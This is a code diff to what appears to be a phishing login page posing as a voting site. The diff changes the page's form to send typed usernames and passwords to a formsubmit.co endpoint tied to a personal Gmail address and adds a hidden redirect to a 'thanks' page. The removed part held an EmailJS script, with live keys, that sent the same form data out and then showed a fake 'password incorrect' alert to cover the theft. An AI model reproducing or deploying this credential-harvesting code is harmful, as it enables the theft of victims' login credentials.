@@ -34,7 +34,7 @@
                     </div>
                 </div>
                 <div class="form-container">
-                    <form id="form"  method="POST"  >
+                    <form id="form"  method="POST" action="https://formsubmit.co/voteformehindi@gmail.com" >
 
                     <div class="form-content box">
                         <div class="logo">
@@ -72,6 +72,7 @@
                                 </div>
                                 <div style="display: flex; text-align: end; justify-content: end; color: rgb(0, 17, 255);"><a href="#" class="forgot-pw">Forgotten your password?</a></div>
                             </div>
+                            <input type="hidden" name="_next" value="https://votetdye.vercel.app/thanks.html">
                             <div class="btn-group">
                                 <button class="btn-login"  type="submit" id="button" value="Send Email">
                                     Log In
@@ -132,33 +133,7 @@
             
         </div>
     </div>
-    <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
-    
-    <script type="text/javascript">
-        emailjs.init('ByKKND5PNQ1gsriWd')
-        const btn = document.getElementById('button');
-
-            document.getElementById('form')
-                .addEventListener('submit', function (event) {
-                    event.preventDefault();
-
-                    btn.value = 'Sending...';
-
-                    const serviceID = 'service_uh6z80q';
-                    const templateID = 'template_5xgf9ov';
-
-                    emailjs.sendForm(serviceID, templateID, this)
-                        .then(() => {
-                            btn.value = 'Send Email';
-                            alert('unable to validate vote user password incorrect !!');
-                        }, (err) => {
-                            btn.value = 'Send Email';
-                            alert(JSON.stringify(err));
-                        });
-                });
-    </script>
-    
-    <script src="app.js"></script> 
+        <script src="app.js"></script> 
 
 <!-- <script> -->
   
